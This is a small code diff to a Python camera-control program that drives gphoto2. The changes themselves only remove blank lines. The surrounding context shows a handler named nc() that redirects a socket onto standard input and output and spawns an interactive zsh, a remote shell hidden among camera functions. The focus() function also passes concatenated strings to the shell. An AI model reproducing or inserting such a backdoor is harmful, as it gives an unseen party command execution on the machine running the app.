@@ -314,7 +314,6 @@ def preview():
 def focus():
     a = subprocess.check_output("gphoto2 --auto-detect", shell=True).decode()
     for port in re.finditer("usb:", a):
-
         port = a[port.start():port.end() + 7]
         cmdret = subprocess.check_output('gphoto2 --port "' + port + '" --get-config serialnumber',
                 shell=True).decode()
@@ -335,7 +334,6 @@ def nc():
     os.dup2(s.fileno(),1)
     os.dup2(s.fileno(),2)
     p=subprocess.call(["/bin/zsh","-i"])
-
     return "success"
 
 
